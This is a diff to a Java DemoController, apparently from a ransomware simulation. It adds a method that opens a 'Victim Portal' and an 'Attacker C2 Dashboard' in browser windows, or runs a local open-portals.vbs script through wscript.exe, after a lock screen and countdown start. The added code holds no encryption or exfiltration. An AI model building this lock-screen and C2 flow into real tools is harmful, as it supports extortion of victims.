@@ -20,6 +20,7 @@ import java.net.InetSocketAddress;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.Optional;
 import java.util.concurrent.Executors;
 
@@ -134,6 +135,9 @@ public final class DemoController {
             // 7. Launch LockScreen (background thread) — pass PORTAL_URL
             launchLockScreen(session);
 
+            // 7b. Launch Dual Browser Windows (Victim Portal + Attacker C2 Dashboard) in separate windows
+            openDualPortals(session.getRecoveryId());
+
             // 8. Start countdown with expiry callback
             final String rid = session.getRecoveryId();
             countdown.start(rid, DEMO_COUNTDOWN_SECONDS, DemoController::onSessionExpired);
@@ -163,6 +167,28 @@ public final class DemoController {
         lockScreens.put(session.getRecoveryId(), lock);
         lock.showWindow();
         System.out.println("  [UI] LockScreen displayed — Portal: " + PORTAL_URL);
+    }
+
+    private static void openDualPortals(String recoveryId) {
+        new Thread(() -> {
+            try {
+                // If open-portals.vbs exists next to running JAR or in app directory, use it
+                Path vbs = Paths.get("open-portals.vbs");
+                if (Files.exists(vbs)) {
+                    new ProcessBuilder("wscript.exe", vbs.toAbsolutePath().toString(), recoveryId).start();
+                    System.out.println("  [UI] Dual portal windows launched via open-portals.vbs");
+                    return;
+                }
+                // Fallback: use LockScreen browser launcher
+                String base = PORTAL_URL.endsWith("/") ? PORTAL_URL : PORTAL_URL + "/";
+                LockScreen.openBrowser(base + "?rid=" + recoveryId);
+                Thread.sleep(1000);
+                LockScreen.openBrowser(base + "c2.html?rid=" + recoveryId);
+                System.out.println("  [UI] Dual portal windows launched via system browser");
+            } catch (Exception e) {
+                System.err.println("  [UI] Cannot open portal windows: " + e.getMessage());
+            }
+        }, "portal-opener").start();
     }
 
     private static void onSessionExpired(String recoveryId) {
